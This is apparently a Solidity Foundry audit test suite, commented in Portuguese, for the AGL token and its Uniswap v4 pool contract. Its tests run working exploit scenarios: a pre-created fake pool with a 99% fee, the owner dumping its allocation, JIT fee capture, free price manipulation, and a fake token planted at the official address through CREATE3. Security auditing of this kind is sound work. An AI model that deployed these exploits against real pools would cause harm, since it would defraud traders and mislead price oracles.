// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IPoolManager } from "v4-core/interfaces/IPoolManager.sol";
import { IHooks } from "v4-core/interfaces/IHooks.sol";
import { PoolKey } from "v4-core/types/PoolKey.sol";
import { PoolIdLibrary } from "v4-core/types/PoolId.sol";
import { Currency } from "v4-core/types/Currency.sol";
import { SwapParams, ModifyLiquidityParams } from "v4-core/types/PoolOperation.sol";
import { TickMath } from "v4-core/libraries/TickMath.sol";
import { StateLibrary } from "v4-core/libraries/StateLibrary.sol";
import { PoolSwapTest } from "v4-core/test/PoolSwapTest.sol";
import { PoolModifyLiquidityTest } from "v4-core/test/PoolModifyLiquidityTest.sol";
import { AGL } from "../../src/AGL.sol";
import { PoolAGL } from "../../src/PoolAGL.sol";
import { ICreateX } from "../../src/ICreateX.sol";
import { BaseAGL } from "../BaseAGL.sol";

interface IV2Factory {
    function createPair(address, address) external returns (address);
}

interface IFiatToken {
    function blacklister() external view returns (address);
    function blacklist(address) external;
}

/// Contrato qualquer publicado pela carteira de publicação no salt da PoolAGL.
contract Impostor {
    function publicar(bytes32 _salt, bytes memory _init) external returns (address) {
        return ICreateX(0xba5Ed099633D3B313e4D5F7bdc1305d3c28ba5Ed).deployCreate3(_salt, _init);
    }
}

/// "AGL" falso com mint livre.
contract AGLFalso is ERC20 {
    constructor(address _quem) ERC20("AgroLastro", "AGL") {
        _mint(_quem, 1e40);
    }

    function decimals() public pure override returns (uint8) {
        return 9;
    }

    function mint(address _a, uint256 _v) external {
        _mint(_a, _v);
    }
}

contract AuditoriaAGL is BaseAGL {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    PoolModifyLiquidityTest lp;

    function setUp() public override {
        super.setUp();
        lp = new PoolModifyLiquidityTest(PM);
    }

    // ------------------------------------------------------------------ A
    /// A1: o endereço do token é público antes do token existir na rede. Qualquer um cria
    /// pool v4 SEM hook (taxa 99%) e par v2 com esse endereço ANTES do lançamento.
    /// Depois do lançamento enche a pool dele com poeira; quem rotear por ela perde ~99%.
    function test_A1_pool_de_terceiro_pre_criada_antes_do_token_existir() public {
        pool = _publicarPool();
        address tk = _enderecoToken();
        assertEq(tk.code.length, 0, "token ainda nao existe");
        bool t0 = tk < MOEDA;
        PoolKey memory falsa = PoolKey(
            t0 ? Currency.wrap(tk) : Currency.wrap(MOEDA),
            t0 ? Currency.wrap(MOEDA) : Currency.wrap(tk),
            990_000,
            10,
            IHooks(address(0))
        );
        vm.prank(atacante);
        PM.initialize(falsa, TickMath.getSqrtPriceAtTick(0)); // preço inventado, aceita
        if (chainid == 56) {
            vm.prank(atacante);
            address par = IV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).createPair(tk, MOEDA);
            assertTrue(par != address(0), "par v2 Pancake criado antes do token");
        }

        // lançamento oficial segue normal
        json = _escada(tk);
        PoolAGL.Faixa[] memory fx = _faixas();
        vm.prank(DEPLOYER);
        pool.lancar(_saltToken(), int24(vm.parseJsonInt(json, ".tickInicial")), fx);
        t = AGL(tk);

        // atacante compra US$ 20 na oficial e põe na pool dele, ao redor do preço oficial
        uint256 tok = _comprar(atacante, _unid(20));
        (, int24 tkOf,,) = PM.getSlot0(pool.chave().toId());
        // move a pool falsa até perto do preço oficial (sem liquidez, é de graça)
        vm.startPrank(atacante);
        PoolSwapTest.TestSettings memory ts = PoolSwapTest.TestSettings(false, false);
        uint160 alvo = TickMath.getSqrtPriceAtTick(tkOf);
        router.swap(falsa, SwapParams(alvo < TickMath.getSqrtPriceAtTick(0), -1, alvo), ts, "");
        int24 base = (tkOf / 10) * 10;
        t.approve(address(lp), type(uint256).max);
        IERC20(MOEDA).approve(address(lp), type(uint256).max);
        deal(MOEDA, atacante, _unid(20));
        lp.modifyLiquidity(falsa, ModifyLiquidityParams(base - 4000, base + 4000, 1e15, 0), "");
        vm.stopPrank();
        tok; // usado só para ter AGL

        // vítima: US$ 52 na pool falsa x na oficial
        address vitima = makeAddr("vitima");
        deal(MOEDA, vitima, _unid(52));
        vm.startPrank(vitima);
        IERC20(MOEDA).approve(address(router), _unid(52));
        uint256 a0 = t.balanceOf(vitima);
        router.swap(falsa, SwapParams(!t0, -int256(_unid(52)), t0 ? TickMath.MAX_SQRT_PRICE - 1 : TickMath.MIN_SQRT_PRICE + 1), ts, "");
        vm.stopPrank();
        uint256 naFalsa = t.balanceOf(vitima) - a0;
        uint256 naOficial = _comprar(makeAddr("vitima2"), _unid(52));
        emit log_named_decimal_uint("AGL na pool falsa (99%)", naFalsa, 9);
        emit log_named_decimal_uint("AGL na pool oficial", naOficial, 9);
        assertLt(naFalsa * 10, naOficial, "pool de terceiro entrega <10% do que a oficial entrega");
    }

    // ------------------------------------------------------------------ B
    /// B1: os 5% do DONO valem um degrau inteiro e estão livres desde o bloco 0.
    /// Com pouca compra, o DONO vende e leva praticamente toda a moeda que os compradores puseram.
    function test_B1_dono_vende_5pct_e_leva_a_moeda_dos_compradores() public {
        _lancar();
        uint256 snap = vm.snapshotState();
        uint256 moedaAntes = IERC20(MOEDA).balanceOf(address(PM));
        // compra pequena (< 1 degrau): DONO leva quase tudo
        uint256 r = _comprar(comprador, _unid(1_000));
        uint256 recebeDono = _vender(DONO, t.balanceOf(DONO));
        emit log_named_decimal_uint("[US$1.000] DONO recebeu vendendo os 5%", recebeDono, casasMoeda);
        assertGt(recebeDono, _unid(950), "DONO leva >95% do que entrou");
        // a venda do DONO atravessou a escada e deixou o preco no extremo: nao sobra moeda
        pool.coletarTaxas(); // os US$20 restantes sao a taxa (do recebedor)
        assertLt(IERC20(MOEDA).balanceOf(address(PM)) - moedaAntes, _unid(1), "< US$1 de moeda sobra na pool");
        uint256 sp = _sqrtP();
        assertTrue(sp == TickMath.MIN_SQRT_PRICE + 1 || sp == TickMath.MAX_SQRT_PRICE - 1, "preco no extremo");
        // a venda do comprador nem executa (limite de preco ja atingido)
        vm.expectRevert();
        this.venderExterno(comprador, r);
        vm.revertToState(snap);
        // compra de US$ 10 mil: DONO leva o degrau de cima
        r = _comprar(comprador, _unid(10_000));
        recebeDono = _vender(DONO, t.balanceOf(DONO));
        uint256 recebeComprador = _vender(comprador, r);
        emit log_named_decimal_uint("[US$10.000] DONO recebeu vendendo os 5%", recebeDono, casasMoeda);
        emit log_named_decimal_uint("[US$10.000] comprador recebe depois", recebeComprador, casasMoeda);
        assertGt(recebeDono, _unid(4_000));
    }

    function venderExterno(address q, uint256 v) external returns (uint256) {
        return _vender(q, v);
    }

    function _sqrtP() internal view returns (uint256 sp) {
        (sp,,,) = PM.getSlot0(pool.chave().toId());
    }

    // ------------------------------------------------------------------ C
    /// C1: JIT. LP de terceiro numa faixa estreita na pool oficial captura a maior parte
    /// dos 2% de uma compra; a taxa do recebedor cai.
    function test_C1_jit_dilui_taxa_do_recebedor() public {
        _lancar();
        bool t0 = pool.tokenEhMoeda0();
        uint256 snap = vm.snapshotState();
        // sem JIT
        _comprar(comprador, _unid(50));
        uint256 a = IERC20(MOEDA).balanceOf(DONO);
        pool.coletarTaxas();
        uint256 taxaSem = IERC20(MOEDA).balanceOf(DONO) - a;
        vm.revertToState(snap);

        // atacante compra AGL antes, depois faz JIT
        uint256 tok = _comprar(atacante, _unid(1_000));
        pool.coletarTaxas(); // zera a taxa da compra do atacante
        PoolKey memory k = pool.chave();
        int24 tk = _tick();
        // faixa só-token logo "à frente" do preço (na direção da compra)
        int24 piso = tk >= 0 ? (tk / 10) * 10 : ((tk - 9) / 10) * 10;
        (int24 lo, int24 hi) = t0 ? (piso + 10, piso + 210) : (piso - 200, piso);
        vm.startPrank(atacante);
        t.approve(address(lp), type(uint256).max);
        // liquidez que cabe em ~todo o AGL comprado
        uint128 L = uint128(_liqPara(lo, hi, tok * 99 / 100, t0));
        lp.modifyLiquidity(k, ModifyLiquidityParams(lo, hi, int256(uint256(L)), 0), "");
        vm.stopPrank();
        _comprar(comprador, _unid(50));
        a = IERC20(MOEDA).balanceOf(DONO);
        pool.coletarTaxas();
        uint256 taxaCom = IERC20(MOEDA).balanceOf(DONO) - a;
        // atacante tira a posição com a taxa
        uint256 m0 = IERC20(MOEDA).balanceOf(atacante);
        vm.prank(atacante);
        lp.modifyLiquidity(k, ModifyLiquidityParams(lo, hi, -int256(uint256(L)), 0), "");
        emit log_named_decimal_uint("moeda que o JIT tirou (venda + taxa)", IERC20(MOEDA).balanceOf(atacante) - m0, casasMoeda);
        emit log_named_decimal_uint("taxa ao recebedor sem JIT", taxaSem, casasMoeda);
        emit log_named_decimal_uint("taxa ao recebedor com JIT", taxaCom, casasMoeda);
        assertLt(taxaCom * 3, taxaSem, "JIT leva mais de 2/3 da taxa");
    }

    function _liqPara(int24 lo, int24 hi, uint256 qtd, bool t0) internal pure returns (uint256) {
        uint256 a = TickMath.getSqrtPriceAtTick(lo);
        uint256 b = TickMath.getSqrtPriceAtTick(hi);
        if (t0) return qtd * (a * b / (1 << 96)) / (b - a);
        return qtd * (1 << 96) / (b - a);
    }

    // ------------------------------------------------------------------ D
    /// D1: no lançamento não há liquidez do lado "de baixo"; qualquer um, com saldo ZERO,
    /// empurra o preço exibido (slot0) até o extremo. Quem compra depois não perde (o swap
    /// atravessa o vazio de graça), mas painel/agregador/oráculo leem preço ~0.
    /// D2: acima do último degrau é igual: preço vai ao máximo de graça.
    function test_D1_D2_preco_empurrado_de_graca() public {
        _lancar();
        bool t0 = pool.tokenEhMoeda0();
        assertEq(t.balanceOf(atacante), 0);
        assertEq(IERC20(MOEDA).balanceOf(atacante), 0);
        uint160 lim = t0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;
        PoolKey memory k = pool.chave();
        vm.prank(atacante);
        router.swap(k, SwapParams(t0, -1, lim), PoolSwapTest.TestSettings(false, false), "");
        (uint160 sp, int24 tkAgora,,) = PM.getSlot0(pool.chave().toId());
        emit log_named_int("tick depois do empurrao (saldo zero)", tkAgora);
        assertEq(sp, lim, "preco no extremo sem pagar nada");
        // comprador seguinte recebe o mesmo que receberia
        uint256 r = _comprar(comprador, _unid(1));
        assertGt(r, 0);

        // D2: compra a escada inteira e empurra para o outro extremo
        PoolAGL.Faixa[] memory fx = pool.todasAsFaixas();
        uint256 naPool;
        for (uint256 i; i < fx.length; i++) naPool += fx[i].quantidade;
        _comprarTokens(makeAddr("baleia"), t.balanceOf(address(PM)) - 1e9);
        uint160 lim2 = t0 ? TickMath.MAX_SQRT_PRICE - 1 : TickMath.MIN_SQRT_PRICE + 1;
        uint256 custo = 10 ** casasMoeda / 1000; // US$ 0,001
        deal(MOEDA, atacante, custo);
        vm.startPrank(atacante);
        IERC20(MOEDA).approve(address(router), custo);
        router.swap(pool.chave(), SwapParams(!t0, -int256(custo), lim2), PoolSwapTest.TestSettings(false, false), "");
        vm.stopPrank();
        (sp,,,) = PM.getSlot0(pool.chave().toId());
        assertEq(sp, lim2, "acima do topo: preco no extremo por US$0,001");
    }

    // ------------------------------------------------------------------ E
    /// E1: recebedor bloqueado na moeda (blacklist USDC/USDT): coletarTaxas reverte inteira,
    /// inclusive a parte em AGL. Não perde nada (fica acumulado) e o próprio recebedor
    /// destrava com transferirRecebedor. Se o recebedor fosse um contrato sem essa chamada,
    /// travava para sempre.
    function test_E1_blacklist_do_recebedor_trava_coleta_ate_trocar() public {
        _lancar();
        _comprar(comprador, _unid(10_000));
        _vender(comprador, t.balanceOf(comprador) / 2); // gera taxa em AGL também
        bool real;
        if (chainid == 8453 || chainid == 42161 || chainid == 10) {
            address bl = IFiatToken(MOEDA).blacklister();
            vm.prank(bl);
            IFiatToken(MOEDA).blacklist(DONO);
            real = true;
        } else {
            vm.mockCallRevert(MOEDA, abi.encodeWithSelector(IERC20.transfer.selector, DONO), "blacklisted");
        }
        emit log_named_string("blacklist", real ? "REAL (FiatToken)" : "simulada (mockCallRevert)");
        vm.expectRevert();
        pool.coletarTaxas();
        address novo = makeAddr("novoRecebedor");
        vm.prank(DONO);
        pool.transferirRecebedor(novo);
        pool.coletarTaxas();
        assertGt(IERC20(MOEDA).balanceOf(novo), _unid(190), "taxa em moeda saiu ao novo");
        assertGt(t.balanceOf(novo), 0, "taxa em AGL saiu ao novo");
    }

    // ------------------------------------------------------------------ F
    /// F1: CREATE3 não amarra o código. Quem controla a carteira de publicação publica
    /// QUALQUER contrato no endereço da PoolAGL numa rede ainda não lançada (ou em qualquer
    /// rede fora da lista, para sempre), e esse contrato publica QUALQUER código no endereço
    /// "oficial" do AGL (ex.: token com mint livre).
    function test_F1_carteira_de_publicacao_poe_token_falso_no_endereco_oficial() public {
        vm.prank(DEPLOYER);
        address imp = ICreateX(CREATEX).deployCreate3(SALT_POOL, type(Impostor).creationCode);
        pool = PoolAGL(imp); // mesmo endereço que a PoolAGL teria
        address oficial = _enderecoToken();
        address falso = Impostor(imp).publicar(_saltToken(), abi.encodePacked(type(AGLFalso).creationCode, abi.encode(atacante)));
        assertEq(falso, oficial, "codigo arbitrario no endereco oficial do AGL");
        AGLFalso(falso).mint(atacante, 1e40);
        assertEq(AGLFalso(falso).symbol(), "AGL");
        emit log_named_address("endereco oficial do AGL, com token falso", falso);
    }

    // ------------------------------------------------------------------ G
    /// G1: terceiro não toca nas posições da PoolAGL (dono da posição = msg.sender do
    /// modifyLiquidity). Poke de liquidez 0 num degrau reverte; liquidez de 1 wei de
    /// terceiro não atrapalha a coleta; callback e hook não chamáveis diretamente.
    function test_G1_terceiro_nao_toca_posicoes_nem_callback() public {
        _lancar();
        _comprar(comprador, _unid(1000));
        PoolAGL.Faixa[] memory fx = pool.todasAsFaixas();
        PoolKey memory k = pool.chave();
        vm.prank(atacante);
        vm.expectRevert();
        lp.modifyLiquidity(k, ModifyLiquidityParams(fx[0].inferior, fx[0].superior, 0, 0), "");

        // 1 wei de liquidez de terceiro no mesmo degrau
        deal(address(t), atacante, 1e9);
        deal(MOEDA, atacante, 1e6);
        vm.startPrank(atacante);
        t.approve(address(lp), type(uint256).max);
        IERC20(MOEDA).approve(address(lp), type(uint256).max);
        lp.modifyLiquidity(k, ModifyLiquidityParams(fx[0].inferior, fx[0].superior, 1, 0), "");
        vm.expectRevert(PoolAGL.SoPoolManager.selector);
        pool.unlockCallback(abi.encode(uint8(2), int24(0)));
        vm.expectRevert(PoolAGL.SoPoolManager.selector);
        pool.beforeInitialize(atacante, k, 1);
        vm.stopPrank();

        uint256 g = gasleft();
        pool.coletarTaxas();
        emit log_named_uint("gas de coletarTaxas (19 degraus)", g - gasleft());
        assertGt(IERC20(MOEDA).balanceOf(DONO), _unid(19));
    }

    // ------------------------------------------------------------------ H
    /// H1: caminho token = currency1 (não testado pelo autor porque o salt é moído para
    /// endereço baixo). Lança com um salt que dá token > moeda e confere meta e liquidez.
    function test_H1_caminho_oposto_ao_do_salt_atual() public {
        pool = _publicarPool();
        bool padraoT0 = _enderecoToken() < MOEDA;
        bytes32 salt;
        address tk;
        for (uint256 i = 1; i < 200; i++) {
            salt = bytes32((uint256(uint160(address(pool))) << 96) | i);
            tk = ICreateX(CREATEX).computeCreate3Address(keccak256(abi.encode(address(pool), salt)));
            if ((tk < MOEDA) != padraoT0) break;
        }
        require((tk < MOEDA) != padraoT0, "sem salt");
        json = _escada(tk);
        PoolAGL.Faixa[] memory fx = _faixas();
        vm.prank(DEPLOYER);
        pool.lancar(salt, int24(vm.parseJsonInt(json, ".tickInicial")), fx);
        t = AGL(tk);
        assertEq(pool.tokenEhMoeda0(), !padraoT0);
        emit log_named_string("orientacao testada", padraoT0 ? "token = currency1" : "token = currency0");
        uint256 naPool;
        for (uint256 i; i < fx.length; i++) naPool += pool.todasAsFaixas()[i].quantidade;
        uint256 gasto = _comprarTokens(comprador, naPool - 1e9);
        uint256 a = IERC20(MOEDA).balanceOf(DONO);
        pool.coletarTaxas();
        uint256 taxas = IERC20(MOEDA).balanceOf(DONO) - a;
        uint256 venda = _vender(DONO, t.balanceOf(DONO));
        emit log_named_decimal_uint("compradores gastaram", gasto, casasMoeda);
        emit log_named_decimal_uint("dono ganhou", taxas + venda, casasMoeda);
        assertApproxEqRel(taxas + venda, _unid(20_000_000) / 7, 0.01e18);
    }
}
